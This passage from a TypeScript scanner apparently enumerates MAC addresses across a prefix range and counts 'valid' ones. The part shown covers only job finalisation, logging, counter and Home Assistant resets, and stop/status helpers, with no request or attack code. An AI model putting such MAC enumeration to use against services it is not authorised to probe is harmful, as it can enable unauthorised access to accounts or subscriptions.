      await addLog(jobId, "warning", "All MAC addresses in the selected prefix space have been searched.");
      await addLog(jobId, "warning", "No more MACs remain to test. Stopping scanner.");
    }

    await db
      .update(scanJobs)
      .set({
        status: finalStatus,
        totalTested: numberToDbInt(tested),
        totalFound: numberToDbInt(found),
        updatedAt: new Date(),
      })
      .where(eq(scanJobs.id, jobId));

    await addLog(jobId, "info", "");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `        Scan ${finalStatus.toUpperCase()}`);
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `Total MACs tested: ${tested.toString()}`);
    await addLog(jobId, "info", `Valid MACs found before reset: ${found.toString()}`);
    await addLog(jobId, "info", "Resetting visible found counter to 0...");

    // User explicitly requested reset of the valid-found counter and HA entity
    // when the user stops the scan OR when all MACs are exhausted / scan ends.
    await resetFoundCounterAndHa(
      jobId,
      abortedEarly ? "stopped" : scannedAllMacs ? "exhausted" : "completed"
    );

    await addLog(jobId, "info", "Found counter reset to 0");
    if (haEntityId) {
      await addLog(jobId, "info", "Home Assistant entity reset to 0");
    }
    await addLog(jobId, "info", "Scanner stopped");
    await addLog(jobId, "info", "════════════════════════════════════════");
  } catch (err) {
    await addLog(jobId, "error", "════════════════════════════════════════");
    await addLog(jobId, "error", "        SCAN FAILED - FATAL ERROR");
    await addLog(jobId, "error", "════════════════════════════════════════");
    await addLog(
      jobId,
      "error",
      `Error: ${err instanceof Error ? err.message : "Unknown error"}`
    );

    await db
      .update(scanJobs)
      .set({ status: "error", updatedAt: new Date() })
      .where(eq(scanJobs.id, jobId));
  } finally {
    activeScans.delete(jobId);
  }
}

// ============================================================================
// STOP / STATUS HELPERS
// ============================================================================

export async function stopScan(jobId: number): Promise<boolean> {
  const controller = activeScans.get(jobId);

  if (controller) {
    controller.abort();
    activeScans.delete(jobId);

    try {
      await resetFoundCounterAndHa(jobId, "stopped");
    } catch {
      // Ignore reset problems during stop.
    }

    return true;
  }

  return false;
}

export function isScanRunning(jobId: number): boolean {
  return activeScans.has(jobId);
}

export function getActiveScans(): number[] {
  return Array.from(activeScans.keys());
}
